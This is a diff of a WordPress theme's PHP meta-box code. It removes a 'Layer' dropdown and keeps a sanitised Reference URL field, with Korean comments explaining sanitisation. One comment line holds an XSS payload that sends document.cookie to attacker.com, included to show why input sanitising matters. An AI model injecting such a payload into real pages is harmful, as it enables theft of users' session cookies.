@@ -93,15 +93,6 @@ add_action('after_setup_theme', 'theme_setup');
 function render_concept_meta_box($post) {
     ?>
     <p>
-        <label for="layer">Layer</label>
-        <select name="concept_layer" id="layer">
-            <option value="entities">Entity</option>
-            <option value="usecase">Use Case</option>
-            <option value="interface">Interface Adapter</option>
-        </select>
-    </p>
-
-    <p>
         <label for="concept_ref_url">Reference URL</label><br>
         <input type="url" id="concept_ref_url" name="concept_ref_url" style="width:100%;">
     </p>
@@ -140,21 +131,13 @@ function save_concept_meta($post_id) {
     }
 
     // 값 존재 확인 후 저장
-    if(isset($_POST['concept_layer'])) {
+    if(isset($_POST['concept_ref_url'])) {
         update_post_meta( // add or update post meta data in wp_postmeta table
             $post_id,
-            'concept_layer', // meta_key에 들어갈 data (input name과 일치시키는 게 편하다)
-            sanitize_text_field($_POST['concept_layer']) 
-            // 문자열 정리 (HTML 태그나 공백 제거 등..) 
+            'concept_ref_url', // meta_key(column) value (input name과 일치시키는 게 편하다)
+            esc_url_raw($_POST['concept_ref_url']) // 
+            // ※ sanitize_text_field() = 문자열 정리 (HTML 태그나 공백 제거 등..) 
             // <script>document.location='http://attacker.com?cookie='+document.cookie;</script>
-        );
-    }
-
-    if(isset($_POST['concept_ref_url'])) {
-        update_post_meta(
-            $post_id,
-            'concept_ref_url',
-            esc_url_raw($_POST['concept_ref_url'])
         );
     }
 }
